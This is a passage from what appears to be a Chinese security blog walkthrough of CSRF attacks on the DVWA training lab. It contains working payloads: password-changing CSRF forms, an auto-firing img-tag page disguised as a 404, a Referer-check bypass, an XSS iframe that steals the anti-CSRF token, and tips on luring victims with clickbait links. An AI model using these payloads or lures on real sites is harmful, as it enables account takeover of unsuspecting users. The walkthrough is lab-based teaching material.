+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.86.131:8042/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qqqq&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qqqq&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093401048.png" alt="image-20220827093401048"></p>
+<p>然后我们需要配置以下<code>phpstudy</code>第二域名(因为默认的代理不抓取localhost的数据)以及本机<code>HOST</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093821989.png" alt="image-20220827093821989"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827094000330.png" alt="image-20220827094000330"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827094310076.png" alt="image-20220827094310076"></p>
+<p>放行后我们的DVWA密码就被修改成了<code>qqqq</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827095422375.png" alt="image-20220827095422375"></p>
+<p><strong>上方为了演示所以构造的&#96;&#96;html<code>需要点击,我们可以将poc放到</code><img>&#96;标签内就不需要点按钮了,只要用户打开就能修改</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.86.131/dvwa/vulnerabilities/csrf/?password_new=qqqq&amp;password_conf=qqqq&amp;Change=Change#&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>404 error<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>保存在<code>poc.html</code>中,发送给用户触发,我们会发现用户的密码被修改.<strong>原理:如前面原理部分所说,<code>html</code>语言的<code>&lt;img&gt;</code>标签的<code>src=&#39;url&#39;</code>可以自动对<code>url</code>进行一次<code>get</code>请求</strong></p>
+<p><strong>诱导用户访问</strong></p>
+<p>如何诱导用户访问呢?我们只需请出UC震惊部的同事就可以了,比如震惊!!汪峰专辑当天爆大瓜,点击链接围观即可:<a target="_blank" rel="noopener" href="http://www.vomcentos.com/poc.html,%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E6%AD%A4%E9%A1%B5%E9%9D%A2%E5%90%8E%E7%9B%B8%E5%BD%93%E4%BA%8E%E4%BB%A5%E8%87%AA%E5%B7%B1%E7%9A%84%E8%BA%AB%E4%BB%BD(%E6%9C%89%E6%95%88cookie)%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E4%BA%86%E4%B8%80%E6%AC%A1%E6%94%B9%E5%AF%86%E7%9A%84get%E8%AF%B7%E6%B1%82">www.vomcentos.com/poc.html,用户访问此页面后相当于以自己的身份(有效cookie)向服务器发送了一次改密的get请求</a> <code>http://192.168.86.131:8042/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code>.而服务端接收了合法用户发起的请求就会执行改密响应,密码即可更改. 访问链接完成后,我们重新登录一下,使用我们修改的密码qqqq可成功登录,证明了密码已被修改.</p>
+<p><strong>实验结果分析</strong></p>
+<p>利用<code>&lt;img&gt;</code>标签来发送get请求是在很多场景下都会使用的小技巧,而对于一些如改密等敏感请求如果处理不当,只是简单的凭借get请求而不做其他一些验证,就容易被攻击者利用</p>
+<h4 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h4><h5 id="请求分析-1"><a href="#请求分析-1" class="headerlink" title="请求分析"></a>请求分析</h5><p>请求分析步骤同低级一样,发现没有<code>token</code>然后将<code>refer</code>删掉看一下</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827103950739.png" alt="image-20220827103950739"> </p>
+<p>可以看到PHP报错<code>PHP Notice:  Undefined index: HTTP_REFERER</code>大概意思就是请求头中的referer不存在</p>
+<p>我们再伪造一个referer试一下,结果报错这个请求有点问题</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104317186.png" alt="image-20220827104317186"></p>
+<p>接下来我们查看<code>DVWA CSRF的源码</code>分析如下:</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104442975.png" alt="image-20220827104442975"></p>
+<p>我们看到如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">     <span class="comment"># 代码块</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>]  <span class="comment"># 获取请求头中的referer值也就是来源地址</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>]   <span class="comment"># 获取请求头中的HOST值如:主机名/域名</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>stripos函数</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104852089.png" alt="image-20220827104852089"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">stripos</span> (<span class="keyword">string</span> 字符串,<span class="keyword">string</span> 要查找的内容);</span><br><span class="line">返回查找的内容的位置,如果未找到返回<span class="literal">FALSE</span></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827105234534.png" alt="image-20220827105234534"></p>
+<p><strong>找到了并且返回为8而不是FALSE,也就是说只要referer中包含服务器的HOST就可以</strong></p>
+<h5 id="构建POC-1"><a href="#构建POC-1" class="headerlink" title="构建POC"></a>构建POC</h5><p>这里使用二级域名的方式构建POC</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110025209.png" alt="image-20220827110025209"></p>
+<p><strong>恶意网页的代码还是用的低级中的代码</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110213730.png" alt="image-20220827110213730"></p>
+<p>我们可以看到密码修改成功,因为我们的域名中本身就带着靶机的HOST所以stripos函数可以找到并且条件成立</p>
+<h4 id="高级-不可能"><a href="#高级-不可能" class="headerlink" title="高级(不可能)"></a>高级(不可能)</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>本步骤将分析请求方式及规则 进行一次正常的改密请求,如下：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110636168.png" alt="image-20220827110636168"></p>
+<p>依旧是get请求,而请求中的参数包含了一个名为<code>user_token</code>的密文,这就是我们前面原理部分提到过的token机制,每一次改密请求token都是一个不可预测的随机数,low medium等级的方法显然不适用了,因为没有token,我们发出的请求就是无效的,而token是未知且难以预测的,从代码中也可以看出使用了token机制.</p>
+<p><strong>值得一提的是:</strong></p>
+<p>​		如果你想用csrf去构造一个恶意页面用来偷取访问该页面的用户的token的话,我只能告诉你,你是不能成功的,这里牵扯到一个名为”跨域”的问题：</p>
+<p>我们的要偷偷访问的地址是<code>http://192.168.86.131:8042/vulnerabilities/csrf</code> ,位于服务器 <code>192.168.86.131</code>上,而我们的攻击页面位于黑客服务器 <code>vmcentos.com</code>（假设）上,两者的域名不同<strong>也不可能伪造一样的域名(域名是唯一的包括后缀)</strong>,域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容,除非域名 A 下的页面主动发送信息给域名 B 的页面,所以我们的域是不能主动获取目标域的信息的,只能等待目标域主动发送信息,而对于<code>user_token</code>之类的敏感信息,目标域是不会主动发送给我们的.所以我们的攻击脚本是不可能取到改密界面中的<code>user_token</code> . 所以,进行到这里,我们判断:仅仅使用csrf是得不到用户token,也完成不了攻击的！</p>
+<p>本步骤将利用xss绕过防御规则 这里需要利用到high 等级的xss漏洞来获取user_token,payload如下：</p>
+<p><code>&lt;iframe src=&#39;../csrf&#39; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827112156674.png" alt="image-20220827112156674"></p>
+<p><strong>我获取好多次token以下面为准</strong></p>
+<p>而获取user_token后,我们就可以重复low等级的步骤,只不过改变一下src里的利用代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.86.131:8042/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password<span class="symbol">&amp;#95;</span>conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8ecf7635b8b09b6caa0a6e1c98dcecc1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此处<code>8ecf7635b8b09b6caa0a6e1c98dcecc1</code>为<code>xss获</code>取到的<code>token</code>,每一次刷新都在改变,请注意.</p>
+<p>注：形似<code>8ecf7635b8b09b6caa0a6e1c98dcecc1</code>的密文为服务端返回的<code>token</code>,对于防御机制较为完善的网站来说,用户要进行敏感操作如<code>支付</code>、<code>改密</code>等时,服务端会发给客户端一个随机数的响应,并且在服务端本身留下此随机数,用户进行敏感操作时必须带上此随机数,如果缺失或者随机数与服务端不匹配,就拒绝该请求.</p>
+<p>接下来即可重复low等级步骤,建立html文档,诱使合法用户打开实现攻击</p>
+<p><strong>请注意！！当你xss弹框出来token时请不要返回csrf页面,因为在你点击csrf进入改密页面时token已经再次刷新！！</strong></p>
+<p><strong>因为目前浏览器不支持跨域所以我们的攻击脚本是不可能取到改密界面中的user_token</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827161149807.png" alt="image-20220827161149807"></p>
+<h4 id="特高级-不可能"><a href="#特高级-不可能" class="headerlink" title="特高级(不可能)"></a>特高级(不可能)</h4><p><strong>DVWA验证了原始密码,如果攻击者不知道原始密码的情况下不会攻击成功</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827142747147.png" alt="image-20220827142747147"></p>
+
+
+
+<div class="article-footer reveal fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/p/csrfhttpskali/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/b32ef3da1162a.svg"/></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/p/csrfhttpskali/&title=HTTP&&CSRF - SafeKiller Zone&pics=https://acgapi.shifeiti.com/api&summary=
+ 
+HTTP协议
+
+ 
+CSRF漏洞
+
+ 
+Kali桌面美化
+
+
+HTTP协议请求标记头
+
+
+协议头字段名
+说明
+示例
+状态
+
+
+
+Accept
+能够接受的回应内容类型（Content-Types）
+Accept: text/pla..."><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/80c07e4dbb303.svg"/></a><a class="social share-item email" href="mailto:?subject=HTTP&&CSRF - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/p/csrfhttpskali/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/a1b00e20f425d.svg"/></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/8411ed322ced6.svg"/></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="visibility:hidden;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/p/csrfhttpskali/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/p/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx+modesecurity/">Security-编译安装openresty2.14+Modsecurity以支持TLSv1.3</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/p/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/">Linux基础命令</a></div></section></div>
+
+
+<div class="related-wrap reveal" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\p\XXEXPath漏洞讲解\" title="XXE&XPath漏洞讲解"><span class="title">XXE&XPath漏洞讲解</span></a></div></section></div>
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></div><div class="sitemap-group"><span class="fs14">笔记</span><a href="/wiki/vue/Vue%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8.html#start">Vue学习笔记</a><a href="/wiki/django/%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B.html">Django学习笔记</a><a href="/wiki/mysql/%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B.html">MySQL学习笔记</a></div><div class="sitemap-group"><span class="fs14">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs14">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+<p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>  
+<!--不蒜子计数器-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!--添加一个访问量-->
+<span>
+      本"<span style="color: hsl(192 98% 55%); font-weight: bold;">页面</ a></span>"访问 <span id="busuanzi_value_page_pv" style="color: hsl(192 98% 55%); font-weight: bold;"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv" style="color: hsl(192 98% 55%); font-weight: bold;"></span>       次 | 总访客 <span id="busuanzi_value_site_uv" style="color: hsl(192 98% 55%); font-weight: bold;"></span> 人
+</span>
+</br>
+<span id="runtime_span"></span>
+<script type="text/javascript">
+function show_runtime() {
+    window.setTimeout("show_runtime()", 1000);
+    X = new Date("2019/11/29 17:00:00");
+    Y = new Date();
+    T = (Y.getTime() - X.getTime());
+    M = 24 * 60 * 60 * 1000;
+    a = T / M;
+    A = Math.floor(a);
+    b = (a - A) * 24;
+    B = Math.floor(b);
+    c = (b - B) * 60;
+    C = Math.floor((b - B) * 60);
+    D = Math.floor((c - C) * 60);
